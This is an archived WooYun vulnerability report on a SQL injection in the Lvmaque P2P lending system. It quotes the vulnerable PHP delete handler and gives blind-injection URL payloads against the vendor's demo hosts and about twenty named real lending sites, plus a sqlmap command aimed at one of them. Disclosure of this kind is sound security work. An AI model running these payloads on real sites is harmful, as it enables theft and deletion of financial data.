{"id": 66903, "wybug_id": "wooyun-2015-0132817", "wybug_title": "绿麻雀网贷系统通用注入一枚", "wybug_corp": "lvmaque.com", "wybug_author": "loopx9", "wybug_date": "2015-08-10 16:18", "wybug_open_date": "2015-11-08 16:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向公众公开  简要描述： 绿麻雀是一款专业的p2p借贷系统，并且提供p2p网贷平台的全方位技术支持和网站运营策划，拥有一支高素质，高学历的技术管理团队，都是来自IT前沿，拥有高超的技术和丰富的制作经验。能为客户提供稳定，高效的服务以及解决问题的最佳方案。 详细说明：  通杀sql注入漏洞，涉及官方多个版本.漏洞文件:App\\Lib\\Action\\HCommonAction.class.php:\n//删除数据\tpublic function doDel(){        $model = D($this->getActionName());        if (!empty($model)) {\t\t\t$id = $_REQUEST['idarr'];            if (isset($id)) {\t\t\t\tif (method_exists($this, '_doDelFilter')) {\t\t\t\t\t$this->_doDelFilter($id);\t\t\t\t}\t\t\t                if (false !== $model->where(\"id in ({$id})\")->delete()) {                    $this->success(L('删除成功'),'',$id);                } else {                    $this->error(L('删除失败'));                }            } else {                $this->error('非法操作');            }        }\t}\n$_REQUEST['idarr']没有经过任何过滤直接进入sql。\n\n系统为 thinkphp mvc结构，所有继承HCommonAction类的action都存在注入，但可以注入的只有几个，原因是系统默认情况下只创建了几个action所对应的表，而其他action因为表不存在而无法注入。以下三个可以注入:\nhttp://localhost/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://localhost/home/Feedback/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://localhost/home/Fund/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)\nmysql盲注，1=1 返回 \"\\u5220\\u9664\\u6210\\u529f\" ==> \"删除成功\". 1=2 返回  删除失败注入发生在delete语句，对数据影响很大，通过注入可以清空全表。\n\n   漏洞证明：  官方多个版本都受到影响:\n绿麻雀系统P2P版https://11.lvmaque.cn/home/Feedback/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://11.lvmaque.cn/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://22.lvmaque.cn/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://22.lvmaque.cn/home/Feedback/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://22.lvmaque.cn/home/fund/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)绿麻雀系统P2P+P2Chttp://33.lvmaque.cn/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://33.lvmaque.cn/home/Feedback/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)绿麻雀系统P2C版http://44.lvmaque.cn/home/Feedback/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://44.lvmaque.cn/home/fund/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://44.lvmaque.cn/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)绿麻雀系统P2P+理财http://55.lvmaque.cn/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://55.lvmaque.cn/home/fund/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://55.lvmaque.cn/home/Feedback/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)\ngoogle搜索到1000多家站点:\n\n随便挑几个都存在注入:\nhttp://www.keyidai.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)https://www.zj-bank.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://shoufax.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.yooxindai.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.zgcfbank.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.nuojincaifu.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.shanghuicf.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.moneyhaodai.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.edingtou.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.hjhdai.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.zcjutou.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.cyy51.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)https://www.fangyidai.com/home/Feedback/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.junbaow.com/home/Feedback/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.sjcfu.com/home/Feedback/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.zczb100.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.yooxindai.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.taishengyd.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)http://www.jinlingdai.cn/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)https://www.qsyidai.com/home/borrow/doDel/idarr/updatexml(1,if(1=1,1,0x22),1)\n\nsqlmap.py -u \"http://www.cyy51.com/home/feedback/doDel\" --data \"idarr=updatexml(1,if(1=1*,1,0x22),1)\" --dbms=mysql --technique=B  --random-agent --threads=10 --dbs\n\n\n   修复方案：  参数过滤做得挺好，却遗漏了这个点。   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-08-10 16:38 厂商回复： 非常感谢您的报告，和乌云网站，问题已经着手处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}